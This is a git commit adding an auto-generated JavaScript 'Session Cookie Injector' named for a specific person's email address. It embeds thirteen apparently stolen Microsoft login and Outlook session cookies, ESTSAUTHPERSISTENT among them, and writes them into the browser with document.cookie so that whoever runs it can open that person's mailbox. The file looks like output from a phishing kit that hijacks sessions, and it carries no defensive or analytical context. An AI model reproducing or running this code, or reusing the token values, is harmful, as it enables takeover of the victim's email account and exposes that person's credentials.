3981fb77807cd363fa60f3bcfd1971105fc4abff
x8080x2 <eu2@eeu.jp>
2025-11-10 08:14:29 +0000

    ok

---
+++ session_data/inject_session_1762762069074.js
@@ -0,0 +1,241 @@
+
+// Session Cookie Injector
+// Auto-generated on 2025-11-10T08:07:49.074Z
+// Session: jaco@smei.co.za (13 cookies)
+
+(function() {
+    console.log('🚀 Injecting 13 cookies for session: jaco@smei.co.za');
+
+    const sessionInfo = {
+        email: 'jaco@smei.co.za',
+        timestamp: '2025-11-10T08:07:49.074Z',
+        cookieCount: 13
+    };
+
+    console.log('📧 Session info:', sessionInfo);
+
+    const cookies = [
+    {
+        "name": "SuiteServiceProxyKey",
+        "value": "6ho1iefsYwacudhAQH2aB+KaS06T62k1Ra2jFlHUbUM=&b0h8O1YbXx8a7N3EzPMVVw==",
+        "domain": "outlook.office.com",
+        "path": "/",
+        "expires": 1920442069,
+        "size": 89,
+        "httpOnly": false,
+        "secure": true,
+        "session": false,
+        "sameSite": "None",
+        "priority": "Medium",
+        "sameParty": false,
+        "sourceScheme": "Secure"
+    },
+    {
+        "name": "luat",
+        "value": "TyBQ4ejuxJGb7aaoEaZkXVDQ4OEbTQRDciA+VOLUgdU62CZNgyaJ7Oj/2z6LvFDKTr/idPahUbDsU1l1ltmQdp47dnY6hYY9mZ9rNjJPlkEM6IgF++BQfTrIBEoHKsNUJsukI/n5Fu19/hoJxnQRAg7J6uJHLfXZPhBpQPgwY0mlvjwEjX7HjQ7B+Q33X7u4vXrySezJbZz/MKjhEU0v/zARifq8VoBSUEZfiTSsXJ5GhS80uIOThfBM5/8QukVUzHWpK0HDIsCr3mUcNaOC+Gr5mwkAOJ3fb2cXergcOkMtAiF1XypZBX5AFZ0hZba1fHfK6do3UyoYNJFk4H/Yfg==",
+        "domain": "outlook.office.com",
+        "path": "/",
+        "expires": 1920442069,
+        "size": 348,
+        "httpOnly": true,
+        "secure": true,
+        "session": false,
+        "sameSite": "None",
+        "priority": "Medium",
+        "sameParty": false,
+        "sourceScheme": "Secure"
+    },
+    {
+        "name": "OWAAppIdType",
+        "value": "Exchange",
+        "domain": "outlook.office.com",
+        "path": "/",
+        "expires": 1920442069,
+        "size": 20,
+        "httpOnly": true,
+        "secure": true,
+        "session": false,
+        "sameSite": "None",
+        "priority": "Medium",
+        "sameParty": false,
+        "sourceScheme": "Secure"
+    },
+    {
+        "name": "ESTSAUTH",
+        "value": "1.AToAalx3KW4t70Km6j4KRnk2GSC_mZE_oQdBhdwCEUeH70gBAAA6AA.AgABFwQAAABlMNzVhAPUTrARzfQjWPtKAwDs_wUA9P_hKiXElLsWi__4F3z3vv8fOSybqlAGZoa3TnVu5rZ1H6QM37JMNHlLj949ZhodEIRKjIAVJK2u0851",
+        "domain": ".login.microsoftonline.com",
+        "path": "/",
+        "expires": 1920442069,
+        "size": 185,
+        "httpOnly": true,
+        "secure": true,
+        "session": false,
+        "sameSite": "None",
+        "priority": "Medium",
+        "sameParty": false,
+        "sourceScheme": "Secure"
+    },
+    {
+        "name": "ESTSAUTHPERSISTENT",
+        "value": "1.AToAalx3KW4t70Km6j4KRnk2GSC_mZE_oQdBhdwCEUeH70gBAAA6AA.AgABFwQAAABlMNzVhAPUTrARzfQjWPtKAwDs_wUA9P_xgmV2Qm5zNrLISy_hKnMNEl2M10o-mR3FMkeNO-v3zBtBbffiDsXoX0Xg0MtFvuHWf26fJwK0M7ShYU62PHz6NYtHS8zhx5xhAzqV3sypfpBIWiT8mdkfJlVbSH4wXp-zZebPW7ZJw4hTrHBKNIK_JRFmYcUaZKq1cNRAYhZqeif48VeaPIICnd7nf3KF6d5jyzsm5GiJv3EzkspVufmoXlXpSc6r9o7A0OmFKILD7WzMofY5ZvjEpV6AX2ZcSxzjwmHDiCZY6ZDI7Ki4cgiSsEYawn2ELLgx3x3nUi46IUW36CjpEQ5KdBt19OWpjJaOmdvl-8qNeIASmSuh8RNLHPJCx-Mib27QAu8BkCuhBhLbX7tGp9I9Z6nqqOxLw_z3oy1tjXgl50nSZli5LktJKhuP09FH4k1_a_knkWvr-_rDXY_xqSIER4RW5mi3bG1RoKAWQTyGqw2KQHrWehYGdsZyi_dufif9KpcITufdcZaMf9wPP0bBlG1hAnNXuJzYz5-k1UpTkVnROVQ1RF0WsI3UJ7WvaHrDkQrIe8Afu7DhktSVvJgcwpLs3BRwFBK3xg",
+        "domain": ".login.microsoftonline.com",
+        "path": "/",
+        "expires": 1920442069,
+        "size": 697,
+        "httpOnly": true,
+        "secure": true,
+        "session": false,
+        "sameSite": "None",
+        "priority": "Medium",
+        "sameParty": false,
+        "sourceScheme": "Secure"
+    },
+    {
+        "name": "esctx-jSEdGwFzhio",
+        "value": "AQABCQEAAABlMNzVhAPUTrARzfQjWPtKy6C2hYKetRS348pSNIZBZGASlKeQvQ8Bwu4tUZDHIhMEPrIxRDIoUd3kNyIvHLlz7D1625YwndH_hY62iQOaPrFzfTfbh4ZUfeVgc0JNTlIiPCU_W59d-OH32P-ozqaZB5t2FKqS7iE3vUCXFPqLMyAA",
+        "domain": ".login.microsoftonline.com",
+        "path": "/",
+        "expires": 1920442069,
+        "size": 201,
+        "httpOnly": true,
+        "secure": true,
+        "session": false,
+        "sameSite": "None",
+        "priority": "Medium",
+        "sameParty": false,
+        "sourceScheme": "Secure"
+    },
+    {
+        "name": "esctx-s34bH42IbY",
+        "value": "AQABCQEAAABlMNzVhAPUTrARzfQjWPtK8e62CWffmmRDBHmqnOtMp1V1Et5xCEqMdIJTY4XpJHsE4MDGnZ-4bd7a0KKWVKRy4tbLipV59HG0Xy9AouqrEt_ywiPpUVU3mZnLTaOAEZBpW8tGfLVaMOq2H69-e0LUFhJUJ7INcKTa-k1OVVQC8yAA",
+        "domain": ".login.microsoftonline.com",
+        "path": "/",
+        "expires": 1920442069,
+        "size": 200,
+        "httpOnly": true,
+        "secure": true,
+        "session": false,
+        "sameSite": "None",
+        "priority": "Medium",
+        "sameParty": false,
+        "sourceScheme": "Secure"
+    },
+    {
+        "name": "fpc",
+        "value": "AhcWYfnZ2W5EqcQPYsgMGLcgV5gUAQAAAFOUo-AOAAAAa4gK1QEAAABHlKPgDgAAALTBvssBAAAASpSj4A4AAAA",
+        "domain": "login.microsoftonline.com",
+        "path": "/",
+        "expires": 1920442069,
+        "size": 90,
+        "httpOnly": true,
+        "secure": true,
+        "session": false,
+        "sameSite": "None",
+        "priority": "Medium",
+        "sameParty": false,
+        "sourceScheme": "Secure"
+    },
+    {
+        "name": "stsservicecookie",
+        "value": "estsfd",
+        "domain": "login.microsoftonline.com",
+        "path": "/",
+        "expires": 1920442069,
+        "size": 22,
+        "httpOnly": true,
+        "secure": true,
+        "session": false,
+        "sameSite": "None",
+        "priority": "Medium",
+        "sameParty": false,
+        "sourceScheme": "Secure"
+    },
+    {
+        "name": "esctx-zBGZzCvMLnQ",
+        "value": "AQABCQEAAABlMNzVhAPUTrARzfQjWPtKMCnWVhl9Xi3xIQJkDA24JnV-fTE4BTJbZ5AFLRsMP59QkuGSKfX28vp23TZbo3Qy94F_0OU5vu5tjZJEAKI_ndABWLZLM3jEqle8rK7PHyV_yqrZbC7v853nHszXkSuYf8VN0_K0zrGYDuehiIbMjiAA",
+        "domain": ".login.microsoftonline.com",
+        "path": "/",
+        "expires": 1920442069,
+        "size": 201,
+        "httpOnly": true,
+        "secure": true,
+        "session": false,
+        "sameSite": "None",
+        "priority": "Medium",
+        "sameParty": false,
+        "sourceScheme": "Secure"
+    },
+    {
+        "name": "x-ms-gateway-slice",
+        "value": "estsfd",
+        "domain": "login.microsoftonline.com",
+        "path": "/",
+        "expires": 1920442069,
+        "size": 24,
+        "httpOnly": true,
+        "secure": true,
+        "session": false,
+        "sameSite": "None",
+        "priority": "Medium",
+        "sameParty": false,
+        "sourceScheme": "Secure"
+    },
+    {
+        "name": "buid",
+        "value": "1.AToAalx3KW4t70Km6j4KRnk2GSC_mZE_oQdBhdwCEUeH70gBAAA6AA.AQABGgEAAABlMNzVhAPUTrARzfQjWPtK4FJaZEBMZ0AqQ4Chgq-nrbW1f65k9favPRbyJJzRdfXz2Scxk_xriSi9YKSddmZlCm0Q6Ckbp_d29obb-lEIS-YVSTxAdUYwWhkKowpZBqYj7R3CACC_l8t7HXfnKDAeCl1mzWsbjeikfobHOfHfp8WOEw2AackWfybKXqVmVYMgAA",
+        "domain": "login.microsoftonline.com",
+        "path": "/",
+        "expires": 1920442069,
+        "size": 267,
+        "httpOnly": true,
+        "secure": true,
+        "session": false,
+        "sameSite": "None",
+        "priority": "Medium",
+        "sameParty": false,
+        "sourceScheme": "Secure"
+    },
+    {
+        "name": "esctx-RVrm1GQVnA",
+        "value": "AQABCQEAAABlMNzVhAPUTrARzfQjWPtKUZtAwWZ8zzMACBLei4r1bFf2lv-0E2_IMf-WuYPROLrul-MOBCYssNaAoW-M58BNg_eLMRYF4whFxQCTG5ZKnDlXE7YcmWXVKjkUuTIQgJCPiE8_B2Tkk5SqMeRNS_-KPj-IgD2fCeNigddHe8EbbyAA",
+        "domain": ".login.microsoftonline.com",
+        "path": "/",
+        "expires": 1920442069,
+        "size": 200,
+        "httpOnly": true,
+        "secure": true,
+        "session": false,
+        "sameSite": "None",
+        "priority": "Medium",
+        "sameParty": false,
+        "sourceScheme": "Secure"
+    }
+];
+    let injected = 0;
+
+    cookies.forEach(cookie => {
+        try {
+            let cookieStr = cookie.name + '=' + cookie.value + ';';
+            cookieStr += 'domain=' + cookie.domain + ';';
+            cookieStr += 'path=' + cookie.path + ';';
+            cookieStr += 'expires=' + new Date(cookie.expires * 1000).toUTCString() + ';';
+            if (cookie.secure) cookieStr += 'secure;';
+            if (cookie.sameSite) cookieStr += 'samesite=' + cookie.sameSite + ';';
+
+            document.cookie = cookieStr;
+            injected++;
+        } catch (e) {
+            console.warn('Failed to inject cookie:', cookie.name);
+        }
+    });
+
+    console.log('✅ Successfully injected ' + injected + ' cookies!');
+    console.log('🌐 Navigate to https://outlook.office.com/mail/ to test');
+
+    // Auto-redirect option
+    setTimeout(() => {
+        if (confirm('Injected ' + injected + ' cookies for jaco@smei.co.za! Open Outlook now?')) {
+            window.open('https://outlook.office.com/mail/', '_blank');
+        }
+    }, 1000);
+})();
